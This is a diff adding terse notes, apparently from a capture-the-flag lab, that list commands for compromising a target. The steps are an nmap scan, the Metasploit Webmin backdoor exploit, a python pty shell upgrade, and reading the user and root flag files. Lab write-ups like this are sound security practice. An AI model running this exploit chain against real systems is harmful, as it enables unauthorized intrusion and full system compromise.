@@ -1,0 +1,8 @@
+1 - nmap -A 10.10.187.240
+2 - msfconsole
+3 - use exploit/linux/http/webmin_backdoor
+4 - run
+5 - python -c 'import pty; pty.spawn("/bin/bash")'
+6 - whoami
+7 - cat /home/dark/user.txt
+8 - cat /root/root.txt
